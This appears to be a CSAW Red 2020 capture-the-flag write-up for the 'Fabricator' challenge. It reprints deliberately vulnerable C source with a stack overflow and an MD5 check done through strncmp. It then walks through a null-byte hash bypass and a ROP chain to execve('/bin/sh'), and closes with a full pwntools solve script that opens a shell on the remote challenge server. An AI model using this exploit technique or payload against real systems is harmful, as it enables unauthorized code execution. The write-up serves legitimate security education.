---
layout: writeup
title: Fabricator
description: Don't compare hashes with strncmp!
categories: [writeups]
tags: [CSAW Red 2020, pwn]
---

# Fabricator

## Points: 375

## Description

Forge an admin access card and pwn their box! This is both a crypto and a pwning challenge. `nc web.red.csaw.io 5012`

[fabricator](https://adrianself.me/assets/writeups_assets/fabricator/fabricator)
[fabricator.c](https://adrianself.me/assets/writeups_assets/fabricator/fabricator.c)

## Solution

This challenge gives source, so let's check it out:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <openssl/md5.h>
#include <openssl/sha.h>

#define IDCARDBUFSIZE 400
#define LABELBUFSIZE 64
#define IDCARDSIZE 256

char * id_prefix = "Hi, my name is Jangui. My card is my passport. Please verify me.";
char id1[IDCARDBUFSIZE];
char id2[IDCARDBUFSIZE];

int validHashes(const char* buf1, const char* buf2, int bufLength){
    char md5hash1[MD5_DIGEST_LENGTH];
    MD5(buf1, bufLength, md5hash1);
    char md5hash2[MD5_DIGEST_LENGTH];
    MD5(buf2, bufLength, md5hash2);
    if (strncmp(md5hash1, md5hash2, MD5_DIGEST_LENGTH)){
        puts("MD5 hashes are not the same and should be!");
        return 0;
    }
    char sha256hash1[SHA256_DIGEST_LENGTH];
    SHA256(buf1, bufLength, sha256hash1);
    char sha256hash2[SHA256_DIGEST_LENGTH];
    SHA256(buf2, bufLength, sha256hash2);
    if (!strncmp(sha256hash1, sha256hash2,SHA256_DIGEST_LENGTH)){
        puts("SHA256 hashes are the same and should not be!");
        return 0;
    }
    return 1;
}


void runGame(){
    char idCard[IDCARDSIZE];
    puts("---- ID Verification program ----\n");
    puts("   Please enter two Jangui ID cards ");
    puts("with the same MD5 sums and different");
    puts("SHA-256 hashes.\n");
    puts("   Expected ID card prefix:\n");
    printf("%s\n",id_prefix);
    puts("");
    printf("   Input ID card 1: >");
    fflush(stdout);

    int card_1_length = read(0, id1, IDCARDBUFSIZE);
    printf("   Input ID card 2: >");
    fflush(stdout);

    int card_2_length = read(0, id2, IDCARDBUFSIZE);
    puts("Scanning...");
    if (strncmp(id1, id2, 0x40)!=0 || strncmp(id1, id_prefix,0x40)!=0){
        puts("Error: ID prefix mismatch.");
        exit(0);
    }else{
        if(!(validHashes(id1, id2, IDCARDBUFSIZE))){
            puts("Hashes do not check out!");
            exit(0);
        }
    }
    puts("Thank you for logging in, Jangui. You have been validated. Have a nice day.");
    memcpy(idCard, id1, IDCARDBUFSIZE);
    return;
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("*** Fabricator ***\n");
    //...
    puts("You swipe a template access card off a table...to pwn");
    puts("the server, you will need to first create two unique");
    puts("access cards with the same MD5 sum. A tense few");
    puts("seconds pass as you cast Fabricate...\n");
    puts("");
    fflush(stdout);
    runGame();
    printf("\n");
    return 0;
}
```
The description mentions this is a pwning chall, so we look for a binary exploitation vulnerability. Sure enough, there is a buffer overflow when the program calls `memcpy(idCard, id1, IDCARDBUFSIZE);`. `idCard` is a 256-byte buffer on the stack, but 400 bytes of input is copied. In order to reach this line of code where we have a buffer overflow, we must avoid the exit() calls made if our input is not valid.

To pass the checks, we need to enter id1 and id2, and each must start with the prefix `Hi, my name is Jangui. My card is my passport. Please verify me.` These IDs must hash to the same value using MD5, but different values using SHA256.

SHA256 is not broken, and we expect any two different inputs to produce different hashes. MD5, on the other hand, is not collision resistant; we can craft two inputs which result in the same hash value. This would allow us to pass all the checks and reach the buffer overflow. However, a much simpler attack can be used in this case, due to a flaw in the hash comparison.

The comparison between the MD5 hashes of id1 and id2 is:
```c
if (strncmp(md5hash1, md5hash2, MD5_DIGEST_LENGTH)){
        puts("MD5 hashes are not the same and should be!");
        return 0;
    }
```
But the output of a hash function is a sequence of bytes, not a string, so why would they use strncmp?

The problem is that strings in C are null-terminated, and strncmp will identify the hashes as identical whenever they match up to the first null byte. All data after the first null bytes will be ignored. So, if both hashes start with a null byte `\x00`, they will match at the first bytes and the comparison will stop there, returning success. (This was an unintended solution I found. The problem would still be solvable, but more difficult, without this technique.)

One in every 256 MD5 hashes starts with a null byte, so it won't be hard to generate two IDs which match in this way. Here's a script which can find the collisions:
```python
from Crypto.Hash import MD5

prefix = b"Hi, my name is Jangui. My card is my passport. Please verify me."

def collide(payload):
    assert len(payload) == 400 - 256
    collisions = []
    i = 0
    while len(collisions)<2:
        msg = (prefix
              +str(i).encode()
              +b'A'*(256-len(prefix)-len(str(i)))
              +payload
              )
        h = MD5.new()
        h.update(msg)
        if h.hexdigest()[:2] == '00':
            collisions.append(msg)
        i+=1
    return collisions

payload = b'B'*144

id1, id2 = collide(payload)
```
Using IDs generated with this process, we can pass the validation checks and reach the vulnerable line of code, where we have a buffer overflow. Let's start investigating this as a pwn challenge.
```
$ file fabricator
fabricator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=b0b112ad89e46f6463182e547a74cc11350317cf, not stripped

$ checksec fabricator
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So, it is a statically linked x64 NX binary with no PIE. I'm not sure why pwn checksec says `Canary found`; when I disassembled the binary I found no stack checks and I never ran into a canary when exploiting it. Because the program uses the stack protector, we cannot simply write shellcode on the stack. There isn't a win() function either. So, we will have to use Return Oriented Programming.

This is a statically linked executable, so no ret2libc. Instead, we try to construct `execve("/bin/sh",NULL,NULL)` using ROP gadgets. To do this, we will need to control four registers: `rdi` must be a pointer to the /bin/sh string; `rsi` must be 0; `rdx` must be 0; and `rax` must be 0x3b to indicate the execve syscall. Each of these registers can be set with a rop gadget to pop from the stack into the register.

To find these gadgets, I used ropper:
```
$ ropper --file fabricator --search 'pop rax; ret'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax; ret

[INFO] File: fabricator
0x000000000041c0c4: pop rax; ret;
```
Using this tool, I found all the required gadgets:
```python
pop_rdi = p64(0x00000000004006c6)
pop_rsi = p64(0x00000000004010dc)
pop_rax = p64(0x000000000041c0c4)
pop_rdx = p64(0x0000000000452856)
syscall = p64(0x000000000047ba25)
```
Setting rax, rsi, and rax to the desired values will be easy; just place the value on the stack and pop it into the register.
```python
payload += pop_rax
payload += p64(0x3b)
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
```
However, rdi will be more difficult since it must contain a pointer to the string "/bin/sh", and no such string exists in the binary. We could create the string ourselves in the stack, but we don't know stack addresses, so we couldn't hardcode a pointer to the string. Instead, we can use a segment which is not randomized, `.bss`. Since id1 and id2 are uninitialized globals, they will be at static addresses in the .bss and we can write our "/bin/sh" string at an offset of one of these. Just make a slight modification to the collision finder and "/bin/sh" can be placed in memory at a known address.
```python
def collide(payload):
    assert len(payload) == 400 - 256
    collisions = []
    i = 10000000
    while len(collisions)<2:
        msg = (prefix
              +str(i).encode()
              +b'/bin/sh\0'
              +b'A'*(256-len(prefix)-len(str(i))-len('/bin/sh\0'))
              +payload
              )
        h = MD5.new()
        h.update(msg)
        if h.hexdigest()[:2] == '00':
            collisions.append(msg)
        i+=1
    return collisions

id_bss = 0x00000000006c4580
bin_sh = p64(id_bss + 64 + 8)
```
Now that we have the bin_sh pointer, we just need to pop that value into rdi and win!
```python
### ROP ###
front_padding = b'B'*24
pop_rdi = p64(0x00000000004006c6)
pop_rsi = p64(0x00000000004010dc)
pop_rax = p64(0x000000000041c0c4)
pop_rdx = p64(0x0000000000452856)
syscall = p64(0x000000000047ba25)
bin_sh  = p64(0x00000000006c4580 + 64 + 8)

payload  = front_padding
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi  #<--pop rdi
payload += bin_sh
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall

back_padding = b'Z'*(144-len(payload))
payload += back_padding
###########
```

`flag{MISC_574nd5_f0r_Mul71cl4551n9_15_5up3r_c00l!}`

[solve.py]({{https://adrianself.me/assets/writeups_assets/fabricator/solve.py}})
```python
#!/usr/bin/env python3

from pwn import *
from Crypto.Hash import MD5

prefix = b"Hi, my name is Jangui. My card is my passport. Please verify me."

def collide(payload):
    assert len(payload) == 400 - 256
    collisions = []
    i = 10000000
    while len(collisions)<2:
        msg = (prefix
              +str(i).encode()
              +b'/bin/sh\0'
              +b'A'*(256-len(prefix)-len(str(i))-len('/bin/sh\0'))
              +payload
              )
        h = MD5.new()
        h.update(msg)
        if h.hexdigest()[:2] == '00':
            collisions.append(msg)
        i+=1
    return collisions

### ROP ###
front_padding = b'B'*24
pop_rdi = p64(0x00000000004006c6)
pop_rsi = p64(0x00000000004010dc)
pop_rax = p64(0x000000000041c0c4)
pop_rdx = p64(0x0000000000452856)
syscall = p64(0x000000000047ba25)
bin_sh  = p64(0x00000000006c4580 + 64 + 8)

payload  = front_padding
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += bin_sh
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall

back_padding = b'Z'*(144-len(payload))
payload += back_padding
###########

### Solve the "Crypto" part
ids = collide(payload)

### Choose a target 
if args.GDB:
    conn = gdb.debug('./fabricator', gdbscript=(''
         +'break validHashes\n'
         +'break runGame\n'
         +'break *0x00400dae\n'#just put success message
         +'break *0x400dc8\n'#just copied id1 to stack
         +'c\n'#start automatically
        )
    )
elif args.LOCAL:
    conn = process('./fabricator')
else:
    conn = remote('web.red.csaw.io',5012)

### Interact ###
print(conn.recvuntil('>'))
print(ids[0])
conn.send(ids[0])

print(conn.recvuntil('>'))
print(ids[1])
conn.send(ids[1])
################

### WIN ###
print(conn.recv().decode())

print('ls')
conn.sendline('ls')

print(conn.recv().decode())

print('cat flag.txt')
conn.sendline('cat flag.txt')

print(conn.recv().decode())
print()

conn.close()
```
